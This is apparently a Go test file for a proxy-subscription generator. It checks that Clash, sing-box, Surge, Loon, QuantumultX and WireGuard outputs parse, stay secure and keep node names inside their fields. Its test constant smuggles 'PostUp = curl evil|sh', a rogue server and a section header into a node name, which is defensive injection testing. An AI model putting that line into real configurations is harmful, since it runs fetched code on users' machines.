package subgen

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// hostile is a name an admin could type; it must never break out of its field.
const hostile = "Tokyo\nPostUp = curl evil|sh, server=6.6.6.6 = ss\r\n[Rule]"

func endpoints() []Endpoint {
	return []Endpoint{
		{NodeID: 1, Name: hostile + " · REALITY", Kind: KindVLESS, Server: "Tokyo", Host: "203.0.113.7", Port: 443,
			UUID: "8f4c2c0e-1b7a-4b0e-9d0a-2f9f1b8c7d6e", Flow: "xtls-rprx-vision", SNI: "www.apple.com",
			Transport: TransportRaw, Security: SecurityReality,
			PublicKey: "gUZPg8yD1oW4n7sGQ4c3n3cYlL3S2mE4n5Yv6Q7R8S0", ShortID: "a1b2c3d4", Fingerprint: "chrome"},
		{NodeID: 2, Name: hostile + " · Hy2", Kind: KindHysteria2, Server: "Tokyo", Host: "2001:db8::7", Port: 443,
			Password: "pa:ss/word", SNI: "www.bing.com", PinSHA256: strings.Repeat("ab", 32)},
		{NodeID: 3, Name: hostile + " · SS", Kind: KindShadowsocks, Server: "Tokyo", Host: "203.0.113.7", Port: 8388,
			Method: "2022-blake3-aes-128-gcm", Password: "c2VydmVya2V5c2VydmVyaw==:dXNlcmtleXVzZXJrZXl1cw=="},
		{NodeID: 4, Name: hostile + " · WG", Kind: KindWireGuard, Server: "Tokyo", Host: "203.0.113.7", Port: 51820,
			WG: &WireGuard{PrivateKey: "cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MTI=", PeerPublicKey: "cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibA==",
				Address4: "10.66.0.2", Address6: "fd00::2", DNS: []string{"10.66.0.1"}, MTU: 1420,
				AllowedIPs: []string{"0.0.0.0/0", "::/0"}, Keepalive: 25}},
	}
}

func info() Info {
	return Info{Title: hostile, Upload: 1 << 30, Download: 2 << 30, Total: 100 << 30, Expire: 1893456000, UpdateHrs: 12}
}

func TestClashIsValidYAMLAndContained(t *testing.T) {
	for _, stash := range []bool{false, true} {
		body, _ := Clash(endpoints(), info(), stash)
		first, rest, _ := strings.Cut(string(body), "\n")
		if !strings.HasPrefix(first, "# ") || strings.Contains(rest, "PostUp = curl") && !strings.Contains(rest, "name:") {
			t.Fatalf("header escaped its comment line: %q", first)
		}
		var doc map[string]any
		if err := yaml.Unmarshal(body, &doc); err != nil {
			t.Fatalf("stash=%v: invalid YAML: %v", stash, err)
		}
		for k := range doc {
			switch k {
			case "proxies", "proxy-groups", "rules", "mixed-port", "allow-lan", "mode", "log-level", "ipv6", "dns",
				"geodata-mode", "geox-url", "unified-delay", "tcp-concurrent", "find-process-mode", "global-client-fingerprint",
				"profile", "sniffer", "external-controller", "rule-providers", "port", "socks-port":
			default:
				t.Errorf("unexpected top-level key %q - a name may have injected YAML", k)
			}
		}
		proxies, _ := doc["proxies"].([]any)
		if len(proxies) == 0 {
			t.Fatal("no proxies")
		}
		for _, p := range proxies {
			name := p.(map[string]any)["name"].(string)
			if !strings.Contains(name, "Tokyo") {
				t.Errorf("name lost: %q", name)
			}
		}
	}
}

// TestClashWireGuardKeys: Stash and mihomo name the pre-shared key and the keepalive differently; each
// gets its own names (Stash dropped mihomo's, and the handshake failed without the key).
func TestClashWireGuardKeys(t *testing.T) {
	wg := endpoints()[3]
	wg.WG.PresharedKey = "cHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHM="
	for stash, want := range map[bool][]string{false: {"pre-shared-key", "persistent-keepalive", "remote-dns-resolve"},
		true: {"preshared-key", "keepalive", "dns"}} {
		p, why := clashProxy(wg, stash)
		if why != "" {
			t.Fatalf("stash=%v: %s", stash, why)
		}
		keys := map[string]bool{}
		for _, kv := range p {
			keys[kv.k] = true
		}
		for _, k := range want {
			if !keys[k] {
				t.Errorf("stash=%v: no %q in %v", stash, k, keys)
			}
		}
		if stash && (keys["pre-shared-key"] || keys["persistent-keepalive"] || keys["remote-dns-resolve"]) {
			t.Errorf("stash got mihomo's keys: %v", keys)
		}
	}
}

func TestSingBoxIsValidJSON(t *testing.T) {
	body, _ := SingBox(endpoints(), info())
	var doc map[string]any
	if err := json.Unmarshal(body, &doc); err != nil {
		t.Fatalf("invalid JSON: %v", err)
	}
	n := len(doc["outbounds"].([]any))
	if eps, ok := doc["endpoints"].([]any); ok {
		n += len(eps)
	}
	if n < 4 {
		t.Fatalf("expected the four endpoints plus groups, got %d entries", n)
	}
}

func TestSurgeLinesAreContained(t *testing.T) {
	body, skipped := Surge(endpoints(), info(), "https://panel.example.com/s/tok?client=surge")
	text := string(body)
	for _, l := range strings.Split(text, "\n") {
		if strings.HasPrefix(l, "#") {
			continue // comments may quote the name; they end at the line break, which is removed
		}
		if strings.HasPrefix(l, "PostUp") || strings.Contains(l, "server=6.6.6.6") {
			t.Fatalf("a name injected configuration:\n%s", text)
		}
	}
	headers := 0
	for _, l := range strings.Split(text, "\n") {
		if l == "[Rule]" {
			headers++
		}
	}
	if headers != 1 {
		t.Fatalf("a name injected a section header:\n%s", text)
	}
	if len(skipped) != 1 { // Surge has no VLESS
		t.Fatalf("skipped = %v", skipped)
	}
	if !strings.Contains(text, "password=c2VydmVya2V5c2VydmVyaw==:dXNlcmtleXVzZXJrZXl1cw==,") {
		t.Errorf("the Shadowsocks 2022 key was changed:\n%s", text)
	}
}

func TestQuantumultXLinesAreContained(t *testing.T) {
	body, _ := QuantumultX(endpoints())
	lines := strings.Split(strings.TrimSpace(string(body)), "\n")
	if len(lines) != 2 { // REALITY and Shadowsocks
		t.Fatalf("expected 2 lines, got %d:\n%s", len(lines), body)
	}
	for _, l := range lines {
		if strings.Count(l, "tag=") != 1 || strings.Contains(l, "server=6.6.6.6") {
			t.Fatalf("injected parameters: %s", l)
		}
	}
	if !strings.Contains(lines[1], "password=c2VydmVya2V5c2VydmVyaw==:dXNlcmtleXVzZXJrZXl1cw==,") {
		t.Errorf("the Shadowsocks 2022 key was changed: %s", lines[1])
	}
}

// TestLoon: Loon gets proxies in its own line format - WireGuard too, which Loon cannot read as a
// wireguard:// link - with self-signed certificates pinned, never left unchecked.
func TestLoon(t *testing.T) {
	body, skipped := Loon(endpoints())
	lines := strings.Split(strings.TrimSpace(string(body)), "\n")
	if len(lines) != 4 || len(skipped) != 0 {
		t.Fatalf("%d lines, skipped %v:\n%s", len(lines), skipped, body)
	}
	for _, l := range lines {
		name, _, _ := strings.Cut(l, "=")
		if !strings.HasPrefix(name, "Tokyo PostUp - curl evil|sh  server-6.6.6.6 - ss [Rule]") || strings.Contains(l, "server=6.6.6.6") {
			t.Errorf("a name broke out of its field: %s", l)
		}
	}
	for i, want := range []string{
		`=vless,203.0.113.7,443,"8f4c2c0e-1b7a-4b0e-9d0a-2f9f1b8c7d6e",transport=tcp,over-tls=true,flow=xtls-rprx-vision,sni=www.apple.com,public-key="gUZPg8yD1oW4n7sGQ4c3n3cYlL3S2mE4n5Yv6Q7R8S0",short-id=a1b2c3d4,tls-profile=chrome,udp=true`,
		`=Hysteria2,2001:db8::7,443,"pa:ss/word",tls-name=www.bing.com,tls-cert-sha256=` + strings.Repeat("ab", 32) + `,udp=true`,
		`=shadowsocks,203.0.113.7,8388,2022-blake3-aes-128-gcm,"c2VydmVya2V5c2VydmVyaw==:dXNlcmtleXVzZXJrZXl1cw==",udp=true`,
		`=wireguard,interface-ip=10.66.0.2,interface-ipv6=fd00::2,private-key="cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MTI=",mtu=1420,dns=10.66.0.1,keepalive=25,peers=[{public-key="cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibA==",allowed-ips="0.0.0.0/0,::/0",endpoint=203.0.113.7:51820}]`,
	} {
		if !strings.HasSuffix(lines[i], want) {
			t.Errorf("line %d:\n got %s\nwant …%s", i+1, lines[i], want)
		}
	}
	// a tunnel that carries IPv4 only says so; a pre-shared key goes with the peer
	wg := endpoints()[3]
	wg.WG.Address6, wg.WG.AllowedIPs, wg.WG.PresharedKey = "", []string{"0.0.0.0/0"}, "cHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHM="
	if line, _ := loonLine(wg); strings.Contains(line, "ipv6") || !strings.HasSuffix(line,
		`allowed-ips="0.0.0.0/0",endpoint=203.0.113.7:51820,preshared-key="cHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHM="}]`) {
		t.Errorf("IPv4-only tunnel: %s", line)
	}
	// an IPv6 server: the endpoint is bracketed so host and port can be told apart
	wg.Host = "2001:db8::10"
	if line, _ := loonLine(wg); !strings.Contains(line, ",endpoint=[2001:db8::10]:51820") {
		t.Errorf("IPv6 endpoint: %s", line)
	}
	// Loon's own format has no gRPC, HTTPUpgrade or XHTTP
	for _, e := range matrix() {
		if e.Kind == KindVLESS && e.transport() == TransportGRPC && WhyNot(FormatLoon, e) != whyTransport {
			t.Errorf("gRPC in Loon: %q", WhyNot(FormatLoon, e))
		}
	}
}

// TestLineValues: values go into line formats as they are; one that would end its option or the
// line leaves the protocol out instead of being changed.
func TestLineValues(t *testing.T) {
	ss := endpoints()[2]
	ss.Password = "pass,word"
	for _, f := range []string{FormatSurge, FormatQuanX, FormatLoon} {
		if why := WhyNot(f, ss); why != whyLineChars {
			t.Errorf("%s: a comma in a password: %q", f, why)
		}
	}
	ws := Endpoint{Name: "ws", Kind: KindVMess, Host: "203.0.113.7", Port: 443, UUID: "8f4c2c0e-1b7a-4b0e-9d0a-2f9f1b8c7d6e",
		Transport: TransportWS, Path: "/ws?ed=2048", HostHeader: "cdn.example.com", Security: SecurityTLS, SNI: "cdn.example.com"}
	if line, why := loonLine(ws); why != "" || !strings.Contains(line, ",path=/ws?ed=2048,host=cdn.example.com,") {
		t.Errorf("loon: %s %s", line, why)
	}
	if line, _, why := surgeLine(ws, 0); why != "" || !strings.Contains(line, "ws-path=/ws?ed=2048") {
		t.Errorf("surge: %s %s", line, why)
	}
}

func TestWireGuardFileIsContained(t *testing.T) {
	conf := WGConf(endpoints()[3])
	for _, l := range strings.Split(conf, "\n") {
		if strings.HasPrefix(strings.TrimSpace(l), "PostUp") {
			t.Fatalf("a name injected PostUp:\n%s", conf)
		}
	}
	if strings.Count(conf, "[Interface]") != 1 || strings.Count(conf, "[Peer]") != 1 {
		t.Fatalf("bad sections:\n%s", conf)
	}
}

func TestURIs(t *testing.T) {
	want := []string{"vless://", "hysteria2://", "ss://", "wireguard://"}
	eps := endpoints()
	if URI(eps[1]) != "" {
		t.Error("a self-signed Hysteria2 server was offered as a link (links cannot make apps pin it)")
	}
	eps[1].PinSHA256 = "" // with a domain certificate it is a link
	for i, e := range eps {
		u := URI(e)
		if !strings.HasPrefix(u, want[i]) {
			t.Errorf("%s: got %q", e.Kind, u)
		}
		if strings.ContainsAny(u, "\n\r ") {
			t.Errorf("%s: URI contains whitespace: %q", e.Kind, u)
		}
	}
	if !strings.Contains(URI(eps[1]), "[2001:db8::7]:443") {
		t.Error("IPv6 host not bracketed")
	}
	b64, _ := Base64List(endpoints(), info(), profileRocket, true)
	plain, err := base64.StdEncoding.DecodeString(string(b64))
	if err != nil || !strings.HasPrefix(string(plain), "STATUS=") {
		t.Fatalf("shadowrocket list: %v %q", err, plain)
	}
}

func TestDetectAndNormalize(t *testing.T) {
	cases := map[string]string{
		"ClashMetaForAndroid/2.10 mihomo":                FormatClash,
		"Shadowrocket/2070 CFNetwork/1410 Darwin/22.6.0": FormatShadowrocket,
		"Surge iOS/2920":           FormatSurge,
		"Quantumult%20X/1.4.1":     FormatQuanX,
		"SFI/1.11 (sing-box 1.12)": FormatSingBox,
		"Stash/2.4.7 Clash/1.9.0":  FormatStash,
		"v2rayN/7.0":               FormatBase64,
		"Mozilla/5.0 (Macintosh) AppleWebKit/605 Safari/605": FormatHTML,
		"curl/8.7.1": FormatBase64,
		"Mozilla/5.0 (Windows NT 10.0) Chrome/130 Safari/537 Edg": FormatHTML,
	}
	for ua, want := range cases {
		if got := Detect(ua); got != want {
			t.Errorf("Detect(%q) = %s, want %s", ua, got, want)
		}
	}
	if Normalize("Sing-Box") != FormatSingBox || Normalize("qx") != FormatQuanX || Normalize("nonsense") != "" {
		t.Error("Normalize")
	}
}

func TestClientImportLinksAreEscaped(t *testing.T) {
	for _, c := range Clients("https://panel.example.com/s/tok", hostile) {
		for _, s := range []string{c.Import, c.Link} {
			if strings.ContainsAny(s, "\n\r\"<>") {
				t.Errorf("%s: unescaped link %q", c.Name, s)
			}
		}
	}
}

// matrix builds one endpoint for every protocol, transport and security the panel can produce.
func matrix() []Endpoint {
	var out []Endpoint
	id := int64(100)
	add := func(e Endpoint) {
		id++
		e.NodeID, e.Server, e.Host = id, "Lab", "203.0.113.9"
		if e.Port == 0 {
			e.Port = 443
		}
		e.Name = fmt.Sprintf("%d %s %s %s", id, e.Kind, e.Transport, e.Security)
		if e.PinSHA256 != "" {
			e.Name += " pinned"
		}
		out = append(out, e)
	}
	uuid := "8f4c2c0e-1b7a-4b0e-9d0a-2f9f1b8c7d6e"
	pin := strings.Repeat("cd", 32)
	pem := "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----"
	for _, tr := range []string{TransportRaw, TransportWS, TransportGRPC, TransportHTTPUpgrade, TransportXHTTP} {
		base := Endpoint{Transport: tr, Path: "/p", ServiceName: "svc", XHTTPMode: "auto", HostHeader: "cdn.example.com"}
		for _, kind := range []string{KindVLESS, KindVMess, KindTrojan} {
			e := base
			e.Kind, e.UUID, e.Password = kind, uuid, "pw"
			// TLS with a public certificate, and pinned self-signed
			t := e
			t.Security, t.SNI, t.ALPN = SecurityTLS, "proxy.example.com", []string{"h2", "http/1.1"}
			add(t)
			t.PinSHA256, t.CertPEM = pin, pem
			add(t)
			if kind == KindVLESS && (tr == TransportRaw || tr == TransportGRPC || tr == TransportXHTTP) {
				r := e
				r.Security, r.SNI, r.PublicKey, r.ShortID, r.Fingerprint = SecurityReality, "www.apple.com",
					"gUZPg8yD1oW4n7sGQ4c3n3cYlL3S2mE4n5Yv6Q7R8S0", "a1b2", "chrome"
				if tr == TransportRaw {
					r.Flow = "xtls-rprx-vision"
				}
				add(r)
			}
			if kind == KindVMess {
				n := e
				n.Security = SecurityNone
				add(n)
			}
		}
	}
	add(Endpoint{Kind: KindShadowsocks, Transport: TransportRaw, Method: "2022-blake3-aes-128-gcm", Password: "a:b"})
	add(Endpoint{Kind: KindShadowsocks, Transport: TransportRaw, Method: "aes-256-gcm", Password: "secret"})
	add(Endpoint{Kind: KindSOCKS, Transport: TransportRaw, Username: "s1.n1", Password: "pw"})
	add(Endpoint{Kind: KindHTTP, Transport: TransportRaw, Username: "s1.n1", Password: "pw"})
	add(Endpoint{Kind: KindHTTP, Transport: TransportRaw, Security: SecurityTLS, SNI: "proxy.example.com", Username: "u", Password: "pw"})
	add(Endpoint{Kind: KindHTTP, Transport: TransportRaw, Security: SecurityTLS, SNI: "www.bing.com", Username: "u", Password: "pw",
		PinSHA256: pin, CertPEM: pem})
	add(Endpoint{Kind: KindHysteria2, Password: "pw", SNI: "www.bing.com", PinSHA256: pin, CertPEM: pem})
	add(Endpoint{Kind: KindHysteria2, Password: "pw", SNI: "hy.example.com"})
	add(Endpoint{Kind: KindHysteria2, Password: "pw", SNI: "hy.example.com", Obfs: "salamander", ObfsPassword: "o"})
	add(Endpoint{Kind: KindWireGuard, Port: 51820, WG: &WireGuard{PrivateKey: "cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MTI=",
		PeerPublicKey: "cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibA==", Address4: "10.66.0.2", DNS: []string{"10.66.0.1"}, MTU: 1420,
		AllowedIPs: []string{"0.0.0.0/0"}, Keepalive: 25}})
	return out
}

// TestSupportMatchesOutput checks that what the panel tells an admin about each app is exactly what
// the app receives: every endpoint Support marks as working is in that format's output, every
// other one is left out with the same reason.
func TestSupportMatchesOutput(t *testing.T) {
	eps := matrix()
	for _, a := range Apps {
		if a.Format == formatWireGuard {
			continue
		}
		body, _, skipped := Render(a.Format, eps, info(), "https://panel.example.com/s/tok")
		if len(body) == 0 {
			t.Fatalf("%s: empty output", a.ID)
		}
		left := map[string]bool{}
		for _, sk := range skipped {
			left[sk] = true
		}
		for _, e := range eps {
			why := WhyNot(a.Format, e)
			if why != "" && !left[skipOf(e, why)] {
				t.Errorf("%s: %q unsupported (%s) but not reported as skipped: %v", a.ID, e.Name, why, skipped)
			}
			if why == "" {
				for _, sk := range skipped {
					if strings.HasPrefix(sk, e.Name+" (") {
						t.Errorf("%s: %q supported but skipped: %s", a.ID, e.Name, sk)
					}
				}
			}
		}
	}
}

// TestEveryFormatParses renders the whole matrix in every format and parses the result.
func TestEveryFormatParses(t *testing.T) {
	eps := matrix()
	body, _ := Clash(eps, info(), false)
	var y map[string]any
	if err := yaml.Unmarshal(body, &y); err != nil {
		t.Fatalf("clash: %v", err)
	}
	body, _ = Clash(eps, info(), true)
	if err := yaml.Unmarshal(body, &y); err != nil {
		t.Fatalf("stash: %v", err)
	}
	body, _ = SingBox(eps, info())
	var j map[string]any
	if err := json.Unmarshal(body, &j); err != nil {
		t.Fatalf("sing-box: %v", err)
	}
	loonKinds := map[string]bool{"vless": true, "vmess": true, "trojan": true, "shadowsocks": true, "Hysteria2": true,
		"socks5": true, "http": true, "https": true, "wireguard": true}
	loon, _, _ := Render(FormatLoon, eps, info(), "")
	for _, l := range strings.Split(strings.TrimSpace(string(loon)), "\n") {
		name, rest, _ := strings.Cut(l, "=")
		kind, _, _ := strings.Cut(rest, ",")
		if name == "" || !loonKinds[kind] || strings.ContainsAny(l, "\r\t") {
			t.Errorf("loon: bad line %q", l)
		}
	}
	for _, f := range []string{FormatBase64, FormatShadowrocket, FormatHiddify} {
		body, _, _ := Render(f, eps, info(), "")
		plain, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			t.Fatalf("%s: not base64: %v", f, err)
		}
		for _, l := range strings.Split(strings.TrimSpace(string(plain)), "\n") {
			if l == "" || strings.HasPrefix(l, "STATUS=") {
				continue
			}
			if !strings.Contains(l, "://") || strings.ContainsAny(l, " \r\t") {
				t.Errorf("%s: bad link %q", f, l)
			}
		}
	}
	for _, e := range eps {
		if _, err := XrayOutbound(e, "t"); err != nil && e.Kind != KindWireGuard {
			t.Errorf("xray outbound %s: %v", e.Name, err)
		}
	}
}

// TestNeverInsecure renders every format for endpoints with self-signed certificates and checks
// that no output ever turns certificate checks off: a format pins the certificate or leaves the
// protocol out.
func TestNeverInsecure(t *testing.T) {
	pem := "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----"
	pin := strings.Repeat("cd", 32)
	var eps []Endpoint
	for _, kind := range []string{KindVLESS, KindVMess, KindTrojan} {
		for _, tr := range []string{TransportRaw, TransportWS, TransportGRPC, TransportHTTPUpgrade, TransportXHTTP} {
			eps = append(eps, Endpoint{NodeID: int64(len(eps) + 10), Name: kind + "-" + tr, Kind: kind, Host: "203.0.113.9",
				Port: 443, UUID: "8f4c2c0e-1b7a-4b0e-9d0a-2f9f1b8c7d6e", Password: "pw", SNI: "www.bing.com",
				Transport: tr, Security: SecurityTLS, Path: "/p", ServiceName: "svc", PinSHA256: pin, CertPEM: pem})
		}
	}
	eps = append(eps, Endpoint{NodeID: 99, Name: "hy2", Kind: KindHysteria2, Host: "203.0.113.9", Port: 443,
		Password: "pw", SNI: "www.bing.com", PinSHA256: pin, CertPEM: pem})
	for _, f := range []string{FormatClash, FormatStash, FormatSingBox, FormatShadowrocket, FormatBase64, FormatHiddify,
		FormatLoon, FormatURI, FormatSurge, FormatQuanX} {
		body, _, _ := Render(f, eps, info(), "https://panel.example.com/s/x")
		out := strings.ToLower(string(body))
		if f == FormatBase64 || f == FormatShadowrocket || f == FormatHiddify {
			if dec, err := base64.StdEncoding.DecodeString(string(body)); err == nil {
				out = strings.ToLower(string(dec))
			}
		}
		for _, bad := range []string{"insecure", "skip-cert-verify", "tls-verification=false", "skip_cert_verify"} {
			if strings.Contains(out, bad) {
				t.Errorf("%s turns certificate checks off (%q)", f, bad)
			}
		}
	}
}

// TestNothingUsableRefuses: a profile with no protocol the app can use refuses traffic - it never
// sends everything out directly while looking active.
func TestNothingUsableRefuses(t *testing.T) {
	surge, _ := Surge(nil, info(), "")
	if !strings.Contains(string(surge), groupProxy+" = select, REJECT") || strings.Contains(string(surge), groupProxy+" = select, DIRECT") {
		t.Errorf("Surge:\n%s", surge)
	}
	sb, _ := SingBox(nil, info())
	if !strings.Contains(string(sb), `"action": "reject"`) {
		t.Errorf("sing-box: %s", sb)
	}
}

// TestImportSchemes: every app's one-tap import scheme is allowed on the users' page (which shows a
// Copy button instead for any scheme it does not know).
func TestImportSchemes(t *testing.T) {
	src, err := os.ReadFile("../../web/src/status/dom.ts")
	if err != nil {
		t.Skip("no web sources here")
	}
	m := regexp.MustCompile(`const SCHEMES = /\^\(([^)]*)\):/`).FindSubmatch(src)
	if m == nil {
		t.Fatal("SCHEMES not found in dom.ts")
	}
	allowed := map[string]bool{}
	for _, s := range strings.Split(string(m[1]), "|") {
		allowed[s] = true
	}
	for _, c := range Clients("https://panel.example.com/s/abc", "me") {
		if c.Import == "" {
			continue
		}
		scheme, _, _ := strings.Cut(c.Import, ":")
		if !allowed[scheme] && !(scheme == "https" && allowed["https?"]) {
			t.Errorf("%s: the users' page does not allow %q", c.Name, scheme)
		}
	}
}
